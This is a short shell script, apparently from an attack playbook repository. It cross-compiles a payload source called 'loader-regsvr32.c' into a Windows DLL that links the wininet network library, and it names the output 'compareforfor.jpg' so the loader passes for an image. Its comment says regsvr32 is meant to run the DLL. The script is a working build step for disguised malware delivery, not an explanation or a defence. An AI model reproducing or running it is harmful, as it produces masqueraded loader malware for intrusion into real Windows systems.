#!/bin/sh
# Build the loader DLL that regsvr32 runs.
# Usage: ./build-loader.sh [outdir]
set -e
here=$(cd "$(dirname "$0")" && pwd)
src="$here/../../../attack-playbook/payloads/loader-regsvr32.c"
out="${1:-.}"
x86_64-w64-mingw32-gcc -O2 -shared -o "$out/compareforfor.jpg" "$src" -lwininet
echo "built $out/compareforfor.jpg"
